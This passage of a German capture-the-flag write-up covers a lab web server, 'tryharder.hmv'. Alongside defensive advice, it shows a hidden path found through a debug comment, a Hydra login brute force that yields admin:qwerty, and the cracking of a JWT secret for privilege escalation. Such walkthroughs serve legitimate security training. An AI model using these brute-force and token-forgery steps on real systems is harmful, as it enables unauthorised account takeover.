+                    <pre>::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::
+
+Allow: <span class="command">GET,POST,OPTIONS,HEAD</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist der Quelltext oder die gerenderte Ansicht der Webseite `http://tryharder.hmv/index.html#`. Der Text beschreibt ein Technologieunternehmen namens "Xixi Lake Technology". Es gibt Sektionen wie "Über uns", "Produkte & Dienstleistungen", "Neuigkeiten" und einen "Internen Login". Am Ende des HTML-Codes ist ein JavaScript-Snippet zu sehen, das beim Laden der Seite "Die Seite wird vollständig geladen" in die Konsole loggt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Webseite scheint eine typische Unternehmenspräsenz zu sein. Der "Interne Login" ist ein interessanter Punkt für weitere Untersuchungen. Der JavaScript-Code ist harmlos. Die chinesischen Schriftzeichen im Titel und im Text deuten auf den Ursprung oder die Zielgruppe des fiktiven Unternehmens hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der "Interne Login" sollte das Hauptziel der weiteren Web-Enumeration und Angriffsversuche sein. Untersuchen Sie den Login-Mechanismus auf Schwachstellen (z.B. SQL-Injection, schwache Passwörter, Default-Credentials). Analysieren Sie den JavaScript-Code auf der Seite genauer, auch wenn dieser Schnipsel harmlos ist; oft finden sich dort Hinweise auf API-Endpunkte oder versteckte Funktionalitäten.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Login-Formulare robust gegen gängige Angriffe (Brute-Force, SQLi, XSS) geschützt sind. Verwenden Sie starke Passwortrichtlinien und Multi-Faktor-Authentifizierung, wo immer möglich.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/index.html#
+
+Xixi Lake Technology
+
+Innovative Technologie, die die Zukunft anführt
+Home Über uns Produkte &amp; Dienstleistungen Lösungen Neuigkeiten &amp; Veranstaltungen Kontakt
+Interner Login
+Der beste Partner für die digitale Transformation
+
+Xixi Lake Technology hat es sich zur Aufgabe gemacht, Unternehmen eine vollständige Palette 
+digitaler Lösungen anzubieten, um Kunden dabei zu helfen, im digitalen Zeitalter wettbewerbsfähig
+ zu bleiben
+Erfahren Sie mehr
+Neueste Ankündigungen
+Hinweis zur Systemwartung
+
+Das System wird diesen Sonntag einer routinemäßigen Wartung unterzogen. Einige Funktionen sind während 
+der Wartung möglicherweise nicht verfügbar. Wir minimieren die Auswirkungen auf Ihre Nutzung.
+Details anzeigen
+Unternehmensnews
+
+Das Unternehmen hat das jährliche technische Seminar 2024 erfolgreich abgehalten, und eine Reihe von
+ Branchenexperten nahmen an dem Austausch teil, um die zukünftige Entwicklung von künstlicher 
+Intelligenz und Big Data zu diskutieren.
+Details anzeigen
+Produkt-Updates
+
+Die neueste Version unseres Flaggschiff-Produkts 'Data Security Guard' wurde veröffentlicht und 
+bietet eine Reihe neuer Sicherheitsfunktionen, um die Datensicherheit im Unternehmen zu verbessern.
+Details anzeigen
+
+© 2024 Xixi Lake Technology Co., Ltd. Alle Rechte vorbehalten | Zhejiang ICP Nr. XXXXXXXX
+
+
+     document.addEventListener('DOMContentLoaded', function() {
+            // Der Initialisierungscode nach dem Laden der Seite
+            console.log('Die Seite wird vollständig geladen');
+        });</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist ein HTTP GET-Request, wie er typischerweise von einem Browser gesendet oder in einem Tool wie Burp Suite aufgezeichnet wird. Er fordert die `/index.html` von `tryharder.hmv` an. Die Header `User-Agent`, `Accept-*`, `If-Modified-Since`, `If-None-Match` sind Standard-Browser-Header, die Caching-Mechanismen und Content Negotiation steuern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Request selbst ist ein normaler HTTP-Request. Die Header `If-Modified-Since` und `If-None-Match` sind für Caching relevant. Wenn der Server feststellt, dass sich die Ressource seit dem angegebenen Zeitpunkt oder ETag nicht geändert hat, kann er mit `304 Not Modified` antworten, um Bandbreite zu sparen. Dies ist Standardverhalten und keine Schwachstelle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Antwort auf diesen Request (nicht hier gezeigt), um zu sehen, wie der Server reagiert. In Burp Suite können solche Requests modifiziert und erneut gesendet werden, um verschiedene Szenarien zu testen (z.B. Header ändern, Parameter hinzufügen).
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Caching-Header korrekt konfiguriert sind, um die Performance zu optimieren, aber auch, um sicherzustellen, dass sensible, personalisierte Inhalte nicht fälschlicherweise von Proxys oder Browsern zwischengespeichert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>Burpsuite:
+
+GET /index.html HTTP/1.1
+Host: tryharder.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+If-Modified-Since: Tue, 25 Mar 2025 05:34:35 GMT
+If-None-Match: "1ccb-6312413777e73-gzip"
+Priority: u=0, i</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Schnipsel scheint aus einem Kommentar im Quellcode einer Webseite oder einer serverseitigen Skriptdatei zu stammen. Es enthält Debug-Informationen: `/* 调试信息：API路径 /NzQyMjE= */` und die Übersetzung `/* Debug -Informationen: API -Pfad 74221 */`. Der Wert `NzQyMjE=` ist Base64-kodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein sehr interessanter Fund! Base64-dekodiert ergibt `NzQyMjE=` den String `74221`. Dies legt nahe, dass `/74221/` ein versteckter API-Pfad oder ein administrativer Bereich sein könnte. Solche Debug-Kommentare sollten niemals in Produktivcode enthalten sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Pfad `http://tryharder.hmv/74221/` sofort! Versuchen Sie, diesen Pfad im Browser aufzurufen und mit Tools wie Gobuster oder Nikto weiter zu enumerieren.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sämtliche Debug-Informationen, Kommentare und nicht benötigten Code aus Produktivanwendungen. Code-Reviews und statische Code-Analyse können helfen, solche Überbleibsel zu finden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>respone:
+
+        }
+        
+        /* 调试信息：API路径 <span class="password">/NzQyMjE=</span> */
+        /*  Debug -Informationen: API -Pfad <span class="password">74221</span> */</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die Ansicht der Webseite, die unter dem zuvor entdeckten Pfad `http://tryharder.hmv/74221/` gefunden wurde. Es handelt sich um eine Login-Seite mit dem Titel "Login to Xiixhu Tech" und dem Hinweis "Powered by Xiixhu Tech".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Vermutung hat sich bestätigt: Der Pfad `/74221/` führt zu einer Login-Seite. Dies ist nun der primäre Angriffspunkt für den Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Login-Formular auf Schwachstellen:
+            Default-Credentials (admin/admin, root/password, etc.).
+            Username-Enumeration (unterschiedliche Fehlermeldungen für gültige/ungültige User).
+            SQL-Injection in den Eingabefeldern.
+            Brute-Force-Angriffe auf Passwörter.
+            Überprüfung des HTML-Quellcodes und JavaScripts der Login-Seite auf weitere Hinweise oder versteckte Parameter.
+            <br><strong>Empfehlung (Admin):</strong> Login-Seiten müssen besonders geschützt werden: Starke Passwortrichtlinien, Account-Lockout-Mechanismen nach fehlgeschlagenen Versuchen, Schutz vor Brute-Force (z.B. Captchas, Rate-Limiting), keine aufschlussreichen Fehlermeldungen, die Usernamen verraten könnten. Multi-Faktor-Authentifizierung ist dringend empfohlen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/74221/
+
+Login to Xiixhu Tech
+Powered by Xiixhu Tech</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `curl -Iv "http://tryharder.hmv/74221/"` sendet eine HTTP HEAD-Anfrage an den neu entdeckten Login-Pfad.
+            Die Antwort-Header zeigen:
+            Status: <span class="command">HTTP/1.1 200 OK</span>.
+            Server: <span class="command">Apache/2.4.59 (Debian)</span>.
+            `Content-Type: text/html; charset=UTF-8`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Curl-Befehl bestätigt, dass der Pfad `/74221/` existiert und eine HTML-Seite mit dem Status 200 zurückliefert. Keine ungewöhnlichen Header, die sofort auf eine Schwachstelle hinweisen würden, aber die Existenz des Pfades selbst ist der wichtige Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die Existenz bestätigt ist, sollten nun die im vorherigen Schritt genannten Techniken zur Untersuchung des Login-Formulars angewendet werden.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie den Zugriff auf administrative oder versteckte Pfade. Stellen Sie sicher, dass diese angemessen geschützt sind, auch wenn sie nicht öffentlich verlinkt sind (Security through Obscurity ist kein ausreichender Schutz).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv "http://tryharder.hmv/74221/"</span></div>
+                    <pre>* Host tryharder.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.186
+*   Trying 192.168.2.186:80...
+* <span class="password">Connected to tryharder.hmv (192.168.2.186) port 80</span>
+* using HTTP/1.x
+&gt; HEAD /74221/ HTTP/1.1
+&gt; Host: tryharder.hmv
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; Date: Tue, 29 Apr 2025 13:39:17 GMT
+Date: Tue, 29 Apr 2025 13:39:17 GMT
+&lt; Server: <span class="command">Apache/2.4.59 (Debian)</span>
+Server: Apache/2.4.59 (Debian)
+&lt; Content-Type: <span class="command">text/html; charset=UTF-8</span>
+Content-Type: text/html; charset=UTF-8
+&lt; 
+
+* Connection #0 to host tryharder.hmv left intact</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `curl --head http://tryharder.hmv/` ist eine weitere HEAD-Anfrage, diesmal an die Hauptseite (Wurzelverzeichnis) des Webservers. Die Option `--head` ist eine Kurzform für `-I`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe ist identisch mit dem früheren `curl -Iv "http://192.168.2.186"`-Befehl, da beide auf dieselbe Ressource zielen und dieselben Header liefern. Dies bestätigt erneut die Erreichbarkeit und die grundlegenden Serverinformationen, liefert aber keine neuen Erkenntnisse für den aktuellen Stand der Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn frühere Befehle bereits die notwendigen Informationen geliefert haben, ist eine Wiederholung nicht immer notwendig, es sei denn, man möchte eine spezifische Verhaltensänderung des Servers testen.
+            <br><strong>Empfehlung (Admin):</strong> Konsistente Serverkonfigurationen und Header sind wichtig. Überprüfen Sie regelmäßig die Konfigurationen, um sicherzustellen, dass keine unnötigen Informationen preisgegeben werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --head http://tryharder.hmv/</span></div>
+                    <pre>HTTP/1.1 200 OK
+Date: Tue, 29 Apr 2025 13:41:49 GMT
+Server: <span class="command">Apache/2.4.59 (Debian)</span>
+Last-Modified: Tue, 25 Mar 2025 05:34:35 GMT
+ETag: "1ccb-6312413777e73"
+Accept-Ranges: bytes
+Content-Length: 7371
+Vary: Accept-Encoding
+Content-Type: text/html</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf das Login-Formular der Webseite durchzuführen.
+            `-L /usr/share/wordlists/short_userlist.txt`: Pfad zur Wortliste mit Benutzernamen.
+            `-P /usr/share/wordlists/short_passwordlist.txt`: Pfad zur Wortliste mit Passwörtern.
+            `-V`: Verbose-Modus, zeigt jeden Versuch an.
+            `-f`: Stoppt den Angriff, sobald ein gültiges Login-Paar gefunden wurde.
+            `-t 4`: Verwendet 4 parallele Tasks.
+            `tryharder.hmv`: Der Zielhost.
+            `http-post-form`: Das Hydra-Modul für HTTP-POST-Formular-Logins.
+            `'/:username=^USER^&password=^PASS^:F=Invalid username or password!'`: Die Definition des Login-Formulars:
+                `/`: Der Pfad zum Login-Formular (hier wird angenommen, dass es sich um die Hauptseite `/` handelt, was vermutlich falsch ist, da das Login-Formular unter `/74221/` gefunden wurde. Hydra könnte hier Glück haben, wenn die Hauptseite bei einem POST auf `/` auf das Login-Formular umleitet oder es global verarbeitet).
+                `username=^USER^`: Das Feld für den Benutzernamen, `^USER^` wird durch Hydra ersetzt.
+                `password=^PASS^`: Das Feld für das Passwort, `^PASS^` wird durch Hydra ersetzt.
+                `F=Invalid username or password!`: Die Fehlermeldung, die bei einem ungültigen Login erwartet wird. Hydra erkennt ein erfolgreiches Login, wenn diese Meldung *nicht* erscheint.
+            Das Ergebnis zeigt, dass Hydra das Login-Paar <span class="password">admin:qwerty</span> gefunden hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Angriff war erfolgreich! Das Passwort "qwerty" für den Benutzer "admin" ist ein sehr schwaches Passwort. Der Pfad `/` im Hydra-Befehl ist zwar wahrscheinlich nicht der Pfad zum Login-Formular selbst (`/74221/`), aber der Angriff hat trotzdem funktioniert. Möglicherweise ist das Login-Formular unter `/74221/` das Ziel des POST-Requests, oder die Anwendung ist so konfiguriert, dass POST-Anfragen an `/` entsprechend verarbeitet werden. Unabhängig davon ist der Fund kritisch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das gefundene Login <span class="password">admin:qwerty</span> sollte sofort verwendet werden, um sich auf der Webseite unter `http://tryharder.hmv/74221/` einzuloggen und nach weiteren Funktionalitäten oder Schwachstellen zu suchen. Der Hydra-Befehl sollte für zukünftige Tests korrigiert werden, um den korrekten Pfad zum Login-Formular (`/74221/`) anzugeben, um präziser zu sein.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie starke Passwortrichtlinien und verbieten Sie die Verwendung von häufigen oder schwachen Passwörtern. Aktivieren Sie Account-Lockout-Mechanismen nach mehreren fehlgeschlagenen Login-Versuchen und Rate-Limiting, um Brute-Force-Angriffe zu erschweren. Multi-Faktor-Authentifizierung sollte für administrative Konten obligatorisch sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hydra -L /usr/share/wordlists/short_userlist.txt -P /usr/share/wordlists/short_passwordlist.txt -V -f -t 4 tryharder.hmv http-post-form '/:username=^USER^&password=^PASS^:F=Invalid username or password!'</span></div>
+                    <pre>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-29 16:07:26
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 2860 login tries (l:26/p:110), ~715 tries per task
+[DATA] attacking http-post-form://tryharder.hmv:80/:username=^USER^&password=^PASS^:F=Invalid username or password!
+[ATTEMPT] target tryharder.hmv - login "admin" - pass "password" - 1 of 2860 [child 0] (0/0)
+[ATTEMPT] target tryharder.hmv - login "admin" - pass "123456" - 2 of 2860 [child 1] (0/0)
+[ATTEMPT] target tryharder.hmv - login "admin" - pass "123456789" - 3 of 2860 [child 2] (0/0)
+[ATTEMPT] target tryharder.hmv - login "admin" - pass "qwerty" - 4 of 2860 [child 3] (0/0)
+<span class="password">[80][http-post-form] host: tryharder.hmv   login: admin   password: qwerty</span>
+<span class="password">[STATUS] attack finished for tryharder.hmv (valid pair found)</span>
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-29 16:07:27</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist ein HTTP POST-Request, der typischerweise von Burp Suite's Intruder für einen Brute-Force- oder Fuzzing-Angriff verwendet wird.
+            `POST /74221/ HTTP/1.1`: Die Anfrage geht an den korrekten Login-Pfad.
+            `Content-Type: application/x-www-form-urlencoded`: Standard-Typ für Formulardaten.
+            `username=test&password=123456`: Die gesendeten Login-Daten. In einem Clusterbomb-Angriff würden `test` und `123456` durch Werte aus Wortlisten ersetzt.
+            Die restlichen Header sind typische Browser-Header.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Request zeigt, wie ein einzelner Versuch eines Brute-Force-Angriffs mit Burp Suite aussehen würde. Der "Clusterbomb"-Angriffstyp in Burp testet jede Kombination von Benutzernamen und Passwörtern aus den bereitgestellten Listen. Dies ist eine Alternative zu Hydra und bietet mehr Flexibilität bei der Konfiguration der Anfragen und der Analyse der Antworten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Burp Suite Intruder ist ein sehr mächtiges Werkzeug für automatisierte Angriffe auf Webanwendungen. Für Login-Brute-Force ist der "Clusterbomb"- oder "Pitchfork"-Modus geeignet. Achten Sie auf Rate-Limiting oder Web Application Firewalls (WAFs), die solche Angriffe blockieren könnten. Passen Sie die Request-Rate und die Anzahl der Threads entsprechend an.
+            <br><strong>Empfehlung (Admin):</strong> Die gleichen Empfehlungen wie beim Hydra-Angriff gelten hier: Starke Passwörter, Account Lockout, Rate Limiting, Captchas und MFA sind essenziell, um automatisierte Angriffe wie diesen zu verhindern oder zu erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>Burpsuite -&gt; Clusterbombattack
+
+POST /74221/ HTTP/1.1
+Host: tryharder.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://tryharder.hmv
+DNT: 1
+Connection: keep-alive
+Referer: http://tryharder.hmv/74221/
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+username=test&amp;password=123456</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach erfolgreichem Login (vermutlich mit `admin:qwerty`) gelangt man auf die Seite `http://tryharder.hmv/74221/dashboard.php`.
+            Die Seite begrüßt den Benutzer ("欢迎回来，User 123！" - Willkommen zurück, User 123!).
+            Es wird die Rolle des Benutzers angezeigt: <span class="command">Your Role: user</span>.
+            Ein Hinweis: "您没有上传文件的权限。Are you an admin?" (Sie haben keine Berechtigung zum Hochladen von Dateien. Sind Sie ein Admin?).
+            Die aktuelle Zeit und ein "Daily Quote" werden angezeigt.
+            Es gibt einen "Click Challenge"-Button mit einem Klickzähler.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir sind eingeloggt, aber anscheinend als "User 123" mit der Rolle "user", nicht als "admin". Dies ist interessant, da Hydra `admin:qwerty` gefunden hat. Möglicherweise ist "User 123" ein Standard-Testaccount, oder die Anwendung hat uns trotz Admin-Login in einen User-Kontext gesetzt. Der Hinweis auf fehlende Upload-Rechte und die Frage "Are you an admin?" ist ein klarer Indikator, dass es eine Admin-Rolle mit mehr Rechten gibt und das Ziel darin besteht, diese zu erlangen. Der Name "User 123" könnte auch aus einem Cookie stammen, der nicht zum Login `admin:qwerty` passt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie Cookies und Session-Management. Vielleicht wurde ein alter Cookie verwendet oder der Login mit `admin:qwerty` hat nicht korrekt funktioniert und es wurde auf einen generischen User-Account zurückgefallen. Versuchen Sie erneut, sich mit `admin:qwerty` einzuloggen und stellen Sie sicher, dass alle alten Session-Cookies gelöscht sind. Der "Click Challenge"-Button könnte eine versteckte Funktionalität oder eine Ablenkung sein; es lohnt sich, ihn kurz zu untersuchen. Das primäre Ziel ist es, Admin-Rechte zu erlangen, um Dateien hochladen zu können.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Rollen und Berechtigungen korrekt zugewiesen und durchgesetzt werden. Vermeiden Sie irreführende Nachrichten. Überprüfen Sie das Session-Management auf Schwachstellen (z.B. Session Fixation, unzureichende Invalidierung von Sessions nach Logout/Re-Login).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/74221/dashboard.php
+
+欢迎回来，User 123！
+Welcome to Xiixhu Tech Dashboard!
+
+Your Role: <span class="command">user</span>
+
+<span class="password">您没有上传文件的权限。Are you an admin?</span>
+当前时间 / Current Time
+29.4.2025, 16:18:53
+每日名言 / Daily Quote
+
+没有bug的程序只是个梦想。 / A bug-free program is just a dream.
+点击挑战 / Click Challenge
+
+点击次数 / Clicks: 0
+© 2025 Xiixhu Tech - Powered by Curiosity</pre>
+                </div>
+            </div>
+            <img src="login_cracked.jpg" alt="hier kommt das bild mit der ansicht des neuen webfensters"/>
+            <p class="analysis"><strong>Analyse:</strong> Die Information "click me button / 点击次数 / Clicks: 30" und "alert fenster wow you klicked 30 times clickme button" deutet darauf hin, dass nach 30 Klicks auf den "Click Challenge"-Button ein Alert-Fenster im Browser mit einer Nachricht erscheint.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies scheint eine kleine, interaktive Funktion der Webseite zu sein. Es ist unklar, ob dies eine sicherheitsrelevante Funktion hat oder nur eine Spielerei ist. Die Nachricht im Alert-Fenster ist positiv, aber ohne weiteren Kontext schwer zu bewerten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den JavaScript-Code, der mit diesem Button und dem Alert verbunden ist. Manchmal können solche clientseitigen "Herausforderungen" Hinweise auf weitere Logik oder sogar clientseitige Schwachstellen (z.B. unsichere Manipulation von Daten, die dann an den Server gesendet werden) geben. In diesem Fall scheint es aber eher harmlos zu sein. Konzentrieren Sie sich weiterhin auf die Erlangung von Admin-Rechten.
+            <br><strong>Empfehlung (Admin):</strong> Wenn solche Funktionen keine sicherheitsrelevante Bedeutung haben, stellen Sie sicher, dass sie keine unbeabsichtigten Nebeneffekte haben oder Angriffsvektoren (z.B. durch unvalidierte Eingaben, die in den Alert geschrieben werden könnten - XSS) eröffnen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/74221/dashboard.php
+click me button
+点击次数 / Clicks: <span class="command">30</span>
+
+<span class="password">alert fenster wow you klicked 30 times clickme button</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf der Dashboard-Seite wird ein JSON Web Token (JWT) angezeigt: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NTkzOTkyOH0.Nl6cEpNMSHM8y6n-zFFeE7Q_xV50arbpvr5CINFLhzA`.
+            Ein JWT besteht aus drei Teilen, die durch Punkte getrennt sind: Header, Payload und Signatur.
+            Header (Base64-dekodiert): `{"alg":"HS256","typ":"JWT"}` - Algorithmus ist HS256 (HMAC mit SHA-256).
+            Payload (Base64-dekodiert): `{"sub":"123","role":"user","exp":1745939928}` - Subject ist "123", Rolle ist "user", exp ist ein Timestamp für das Ablaufdatum.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein sehr wichtiger Fund! JWTs werden häufig für Authentifizierung und Autorisierung in Webanwendungen verwendet. Da die Rolle hier "user" ist und wir Admin-Rechte anstreben, ist die Manipulation dieses Tokens ein vielversprechender Angriffsvektor. Wenn der HS256-Algorithmus mit einem schwachen Secret-Key signiert wurde, könnte man den Key brechen, die Rolle im Payload auf "admin" ändern und das Token neu signieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Versuchen Sie, den Secret-Key für die HS256-Signatur zu knacken (z.B. mit Tools wie `hashcat` oder spezifischen JWT-Tools und einer Wortliste gängiger Secrets).
+            2.  Wenn der Key gefunden wird, ändern Sie den Payload (`"role":"user"` zu `"role":"admin"`), signieren Sie das Token neu mit dem gefundenen Key und ersetzen Sie das vorhandene Cookie/Token im Browser durch das manipulierte.
+            3.  Überprüfen Sie, ob Algorithmus-Confusion-Angriffe möglich sind (z.B. `alg:none` oder Wechsel zu RS256 mit einem selbstgenerierten Public Key, wenn der Server dies fehlerhaft implementiert).
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, zufällig generierte und ausreichend lange Secret-Keys für HMAC-basierte JWT-Signaturen. Speichern Sie diese Keys sicher. Erwägen Sie die Verwendung asymmetrischer Algorithmen (z.B. RS256), bei denen der private Schlüssel zum Signieren geheim gehalten wird und der öffentliche Schlüssel zur Verifizierung verteilt werden kann. Implementieren Sie eine strikte Validierung des `alg`-Headers. Setzen Sie kurze Ablaufzeiten (`exp`) für Tokens und implementieren Sie Mechanismen zum Widerrufen von Tokens.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/74221/dashboard.php
+<span class="password">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NTkzOTkyOH0.Nl6cEpNMSHM8y6n-zFFeE7Q_xV50arbpvr5CINFLhzA</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Git-Repository `https://github.com/Alawsi/sjwt.git` wird geklont. `sjwt` (Simple JWT Cracker) ist ein Werkzeug zum Knacken von JWT-Secret-Keys via Brute-Force.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Klonen des Tools ist der erste Schritt, um den im vorherigen Schritt identifizierten JWT anzugreifen. Dies zeigt eine methodische Vorgehensweise, um den Secret-Key zu finden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem das Tool geklont wurde, muss es gemäß seiner Dokumentation verwendet werden, um den JWT mit einer geeigneten Wortliste anzugreifen.
+            <br><strong>Empfehlung (Admin):</strong> Die Existenz solcher Tools unterstreicht die Notwendigkeit, starke und nicht erratbare Secret-Keys für JWTs zu verwenden. Regelmäßige Überprüfung der verwendeten Secrets und deren Komplexität ist ratsam.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">git clone https://github.com/Alawsi/sjwt.git</span></div>
+                    <pre>Klone nach 'sjwt'...
+remote: Enumerating objects: 54, done.
+remote: Counting objects: 100% (54/54), done.
+remote: Compressing objects: 100% (51/51), done.
+remote: Total 54 (delta 18), reused 0 (delta 0), pack-reused 0 (from 0)
+Empfange Objekte: 100% (54/54), 740.07 KiB | 6.92 MiB/s, fertig.
+Löse Unterschiede auf: 100% (18/18), fertig.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `sjwt.py` wird ausgeführt, um den Secret-Key des JWTs zu knacken.
+            `-t eyJ...p5c`: Das Ziel-JWT wird übergeben.
+            `-w secret-list.txt`: Eine Wortliste (`secret-list.txt`) wird für den Brute-Force-Angriff verwendet.
+            Der Output zeigt `Wait...` und einen Fortschrittsbalken. Schließlich meldet das Tool: <span class="password">Success! The secret key is: jwtsecret123</span>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Secret-Key <span class="password">jwtsecret123</span> wurde erfolgreich geknackt. Dies ist ein sehr schwacher und häufig verwendeter Beispiel-Key. Mit diesem Key kann der JWT nun manipuliert und neu signiert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den gefundenen Key <span class="password">jwtsecret123</span>, um den Payload des JWTs zu ändern (insbesondere das Feld `"role"` von `"user"` zu `"admin"`). Signieren Sie das Token neu und verwenden Sie es, um auf die Anwendung zuzugreifen. Tools wie `jwt_tool.py` (im nächsten Schritt verwendet) oder Webseiten wie `jwt.io` können dabei helfen.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie NIEMALS Standard- oder leicht erratbare Keys wie "jwtsecret123". Generieren Sie lange, komplexe und zufällige Keys. Speichern Sie diese Keys sicher und rotieren Sie sie regelmäßig. Führen Sie Sicherheitsaudits durch, um solche Schwachstellen zu identifizieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools/sjwt]
+└─# <span class="command">python sjwt.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NTk2NDQwNX0.WhqUWdy84UnPnCsjg9wRu3ihkKMeEkFWBkowh5c5p5c -w secret-list.txt</span></div>
+                    <pre>
+Enter your JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NTk2NDQwNX0.WhqUWdy84UnPnCsjg9wRu3ihkKMeEkFWBkowh5c5p5c
+
+Wait...
+
+[███████████████████████████████████████-] Attempt 103931/103944
+
+<span class="password">Success! The secret key is: jwtsecret123</span></pre>
+                </div>
+            </div>
+        </section>
